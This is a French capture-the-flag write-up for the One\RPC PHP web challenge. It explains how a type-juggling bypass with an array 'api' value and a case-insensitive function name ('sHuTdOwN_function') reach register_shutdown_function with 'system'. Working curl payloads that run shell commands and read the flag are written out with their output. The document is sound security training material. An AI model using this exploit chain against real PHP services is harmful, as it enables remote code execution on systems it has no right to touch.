> Name: One\\RPC
> 
> Category:  Web
> 
> Difficulty: Medium/Hard
> 
> Description: 
> *One\RPC seems to be a new promising open source project. But can it be simple, powerful and secure at the same time ?*
> 
> *Review the source code of this project and help the community by finding a critical vulnerability.*

![Pasted image 20230730132345](https://github.com/pun-private/writeup-barbhack2023-web/assets/27222105/972e4ff5-79dd-486c-9ae6-5af16d103787)

**One\RPC** est un projet Open Source visant à simplifier et accélérer le développement des API. L'idée est qu'il y ait un unique endpoint POST où l'on envoie un seul JSON contenant trois champs :

```
{
    "api": "le nom du namespace de l'API",
    "func": "le nom de la méthode à appeler dans ce namespace",
    "args": [
	    "parametre 1",
	    "parametre 2",
	    "..."
    ]
}
```

Un exemple d'appel à cette api est :

```
$> curl -X POST 'http://challs:40006/demo-rpc/' --data-raw 
'{ "api" : "Greeting", "func": "welcome", "args": [ "Chuck" ] }'
```

Est-ce qu'il serait possible d'exécuter du code arbitraire ?

Tout d'abord, il est important de noter que la demo tourne en `PHP 7.4`  !

Le code source du projet demo à la structure suivante :
```
|__ API/    <- Les fichiers API à charger
|
|__ Public/ <- Dossier à exposer sur le webserveur
|	|__ index.php
|
|__ deps_loader.php <- chargeur automatique des fichiers de l'API
|__ dispatcher.php  <- le "routeur" de OneRPC

```

L'essentiel du projet se passe dans la fonction `call_api` du fichier `dispatcher.php` :

```php
function check_forbidden_func($func_name) {
    if (array_search($func_name, get_defined_functions()["internal"]) !== false) {
        throw new Exception("Forbidden function name.");
    }
}

function call_api($json) {

    if (empty($json->api) || preg_match('/^[\\\\]|[^a-zA-Z0-9\\\\]/', $json->api) === 1) {
        throw new Exception("Invalid 'api' endpoint.");
    }
    $json->api = rtrim($json->api, '\\');

    $json->func = "register_{$json->func}";
    check_forbidden_func($json->func);

    $api_func = "{$json->api}\\{$json->func}";
    if (function_exists($api_func) === false) {
        throw new Exception("Unknown function $api_func");
    }

    return $api_func(...(empty($json->args) ? [] : $json->args));
}
```

`$api_func` est une concaténation du namespace `$json->api` et de la fonction `register_${json->func}` ce qui donne par exemple : `Greeting\register_welcome`.

On va dans un premier temps essayer d'enlever la partie namespace :

```php
if (empty($json->api) || preg_match('/^[\\\\]|[^a-zA-Z0-9\\\\]/', $json->api) === 1) {
	throw new Exception("Invalid 'api' endpoint.");
}
$json->api = rtrim($json->api, '\\');
```

Dans ce code il y a trois problèmes :
1. "$json->api" n'est pas vérifié en tant que string
2. preg_match en PHP 7.4 émet un warning quand le deuxieme paramètre n'est pas une string et retourne false
3. rtrim en PHP 7.4 retourne NULL quand les types de paramètre ne sont pas du bon type

Cet extrait de JSON bypass cette partie et permet d'avoir NULL dans `$api_json` :

```
"api": [ "foo" ]
```

Pour pouvoir appeler une fonction native de PHP, il faut désormais contourner cette partie :

```php
$json->func = "register_{$json->func}";
check_forbidden_func($json->func);
```

Il faut trouver une fonction php native qui commence par `register_`. Pour cela, il suffit d'aller sur la documentation PHP et d'en trouver :

![Pasted image 20230730135444](https://github.com/pun-private/writeup-barbhack2023-web/assets/27222105/a8b1838a-7312-4d36-ae87-a4fb55439a67)

https://www.php.net/manual/en/function.register-shutdown-function => permet d'appeler une fonction à la fin d'exécution du script

Le problème c'est que le nom de cette fonction est détectée dans la vérification "check_forbidden_func" qui récupère le nom de toutes les fonctions internes PHP et le compare avec notre fonction... Sauf qu'en PHP, les noms des fonctions ne sont pas sensibles à la casse (contrairement aux nom de variable) =)

Donc nouveau bypass avec :

```
{
	"api": [ "foo" ],
	"func": "sHuTdOwN_function"
}
```

Maintenant il ne reste plus qu'à utiliser les bons paramètres :

```
{
	"api": [ "foo" ],
	"func": "sHuTdOwN_function",
	"args": ["system", "<command>"]
}
```


Flag :

```
$> curl -X POST 'http://challs:40006/demo-rpc/' --data-raw 
'{ "api" : [ "foo" ], "func": "sHuTdOwN_function", "args": ["system", "ls"] }'

{
    "result": null
}
0>___FLAG___<0
demo-rpc
front
html

$> curl -X POST 'http://challs:40006/demo-rpc/' --data-raw 
'{ "api" : [ "foo" ], "func": "sHuTdOwN_function", "args": ["system", "cat 0*/*"] }'

{
    "result": null
}
ALG{N4M3594C3_42817242Y_C0D3_3X3CU710N_4FUN}                                           
```
